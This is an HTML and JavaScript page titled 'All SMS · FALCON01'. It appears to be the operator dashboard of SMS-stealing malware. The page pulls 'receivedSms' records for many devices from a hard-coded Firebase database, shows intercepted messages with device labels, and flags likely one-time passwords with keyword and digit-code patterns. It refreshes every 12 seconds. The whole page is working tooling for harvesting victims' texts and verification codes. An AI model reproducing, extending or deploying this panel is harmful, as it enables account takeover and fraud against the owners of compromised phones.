<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>All SMS · FALCON01</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            background: #0a0e14; color: #e6edf3; padding: 16px; min-height: 100vh;
        }
        .container { max-width: 900px; margin: 0 auto; }
        .header {
            display: flex; justify-content: space-between; align-items: center;
            padding: 12px 20px; background: #161b22; border-radius: 12px;
            border: 1px solid #30363d; margin-bottom: 16px; gap: 10px; flex-wrap: wrap;
        }
        .header-left { display: flex; align-items: center; gap: 12px; }
        .back-btn {
            background: transparent; color: #58a6ff; border: 1px solid #30363d;
            padding: 6px 14px; border-radius: 6px; cursor: pointer; font-size: 13px;
            text-decoration: none; display: inline-flex; align-items: center;
        }
        .back-btn:hover { background: #1c2333; border-color: #58a6ff; }
        .title { font-size: 18px; font-weight: 600; }
        .badge { background: #21262d; padding: 3px 12px; border-radius: 16px; font-size: 12px; color: #8b949e; }
        .controls { display: flex; margin-bottom: 16px; padding: 12px 16px; background: #161b22; border-radius: 10px; border: 1px solid #30363d; }
        .search-input { background: #0d1117; border: 1px solid #30363d; border-radius: 6px; padding: 6px 12px; color: #e6edf3; font-size: 13px; width: 100%; }
        .search-input:focus { outline: none; border-color: #58a6ff; }
        .sms-list { display: flex; flex-direction: column; gap: 8px; }
        .sms-card { background: #161b22; border: 1px solid #30363d; border-radius: 10px; padding: 14px 16px; }
        .sms-card.otp-alert { border-left: 4px solid #db8e2f; background: linear-gradient(145deg, #1f1b16, #161b22); }
        .otp-badge { background: #db8e2f; color: #0a0e14; font-size: 10px; padding: 1px 6px; border-radius: 4px; font-weight: bold; margin-left: 6px; }
        .meta-row { display: flex; justify-content: space-between; margin-bottom: 6px; font-size: 13px; }
        .sender-info { font-weight: 600; color: #58a6ff; display: flex; align-items: center; gap: 6px; }
        .device-tag { font-size: 10px; color: #8b949e; background: #21262d; padding: 1px 6px; border-radius: 4px; font-family: monospace; }
        .timestamp { color: #8b949e; font-size: 11px; }
        .message-body { font-size: 14px; line-height: 1.5; color: #e6edf3; white-space: pre-wrap; word-break: break-word; }
        .highlighter { background: rgba(219, 142, 47, 0.2); color: #f0f6fc; border-bottom: 2px dashed #db8e2f; padding: 0 2px; font-family: monospace; font-weight: bold; }
        .loading, .no-data { text-align: center; padding: 40px; color: #8b949e; }
        .spinner { display: inline-block; width: 32px; height: 32px; border: 3px solid #21262d; border-top: 3px solid #58a6ff; border-radius: 50%; animation: spin 0.8s linear infinite; margin-bottom: 10px; }
        @keyframes spin { to { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="header-left"><a href="index.html" class="back-btn">← Dashboard</a><div class="title">📨 Global SMS Feed</div></div>
            <span class="badge">Total Logged: <span id="feedCount">0</span></span>
        </div>
        <div class="controls"><input type="text" id="feedSearch" class="search-input" placeholder="Search by sender, keyword, or device description..." /></div>
        <div id="feedContainer">
            <div id="loadingFeed" class="loading"><div class="spinner"></div><p>Aggregating parallel device storage logs...</p></div>
            <div id="smsList" class="sms-list" style="display:none;"></div>
            <div id="noData" class="no-data" style="display:none;"><p>No captured text items found across any current profiles.</p></div>
        </div>
    </div>
    <script>
        const DB_URL = 'https://fortydata-fee65-default-rtdb.firebaseio.com/admin/FALCON01/users.json';
        const MAX_GLOBAL_RENDER = 50;
        let allMessages = [];

        const feedSearch = document.getElementById('feedSearch');
        const smsList = document.getElementById('smsList');
        const loadingFeed = document.getElementById('loadingFeed');
        const noData = document.getElementById('noData');
        const feedCount = document.getElementById('feedCount');

        function formatTimestamp(ts) {
            if (!ts) return '—';
            return new Date(ts).toLocaleString('en-IN', { day: '2-digit', month: 'short', hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: true });
        }

        function highlightKeywords(text) {
            if (!text) return { html: '', isOtp: false };
            const otpRegex = /\b([0-9]{4,6})\b/;
            const alertKeywords = /otp|verify|code|verification|secret|swiggy|password/i;
            let isOtp = alertKeywords.test(text) || otpRegex.test(text);
            let escaped = escapeHtml(text);
            if (isOtp) escaped = escaped.replace(/\b([0-9]{4,6})\b/g, '<span class="highlighter">$1</span>');
            return { html: escaped, isOtp };
        }

        function escapeHtml(str) {
            const div = document.createElement('div'); div.textContent = str; return div.innerHTML;
        }

        async function dynamicLoadFeed() {
            try {
                const resp = await fetch(DB_URL, { headers: { 'Cache-Control': 'no-cache' } });
                const usersTree = await resp.json();
                const consolidatedList = [];
                if (usersTree && typeof usersTree === 'object') {
                    for (const [deviceId, deviceProfile] of Object.entries(usersTree)) {
                        if (deviceProfile?.receivedSms) {
                            const label = deviceProfile.deviceInfo?.model || deviceId.slice(0,8);
                            for (const [smsId, smsItem] of Object.entries(deviceProfile.receivedSms)) {
                                consolidatedList.push({ id: smsId, deviceId, deviceLabel: label, sender: smsItem.sender || 'Unknown', message: smsItem.message || '', timestamp: smsItem.timestamp || 0 });
                            }
                        }
                    }
                }
                consolidatedList.sort((a, b) => b.timestamp - a.timestamp);
                allMessages = consolidatedList;
                feedCount.textContent = allMessages.length;
                applySearchFiltering();
            } catch (err) { loadingFeed.innerHTML = `<p style="color:#f85149;">Stream mapping error: ${err.message}</p>`; }
        }

        function applySearchFiltering() {
            loadingFeed.style.display = 'none'; const query = feedSearch.value.toLowerCase().trim();
            const filtered = allMessages.filter(m => m.sender.toLowerCase().includes(query) || m.message.toLowerCase().includes(query) || m.deviceId.toLowerCase().includes(query) || m.deviceLabel.toLowerCase().includes(query));
            if (filtered.length === 0) { smsList.style.display = 'none'; noData.style.display = 'block'; return; }
            smsList.style.display = 'flex'; noData.style.display = 'none';
            const fragment = document.createDocumentFragment();
            filtered.slice(0, MAX_GLOBAL_RENDER).forEach(msg => {
                const parsed = highlightKeywords(msg.message); const card = document.createElement('div');
                card.className = `sms-card ${parsed.isOtp ? 'otp-alert' : ''}`;
                card.innerHTML = `
                    <div class="meta-row">
                        <span class="sender-info">📨 ${escapeHtml(msg.sender)} <span class="device-tag">📱 ${escapeHtml(msg.deviceLabel)}</span>${parsed.isOtp ? '<span class="otp-badge">OTP TOKEN</span>' : ''}</span>
                        <span class="timestamp">${formatTimestamp(msg.timestamp)}</span>
                    </div>
                    <div class="message-body">${parsed.html}</div>
                `;
                fragment.appendChild(card);
            });
            smsList.innerHTML = ''; smsList.appendChild(fragment);
        }
        feedSearch.addEventListener('input', applySearchFiltering);
        dynamicLoadFeed();
        setInterval(() => { if(!document.hidden) dynamicLoadFeed(); }, 12000);
    </script>
</body>
</html>
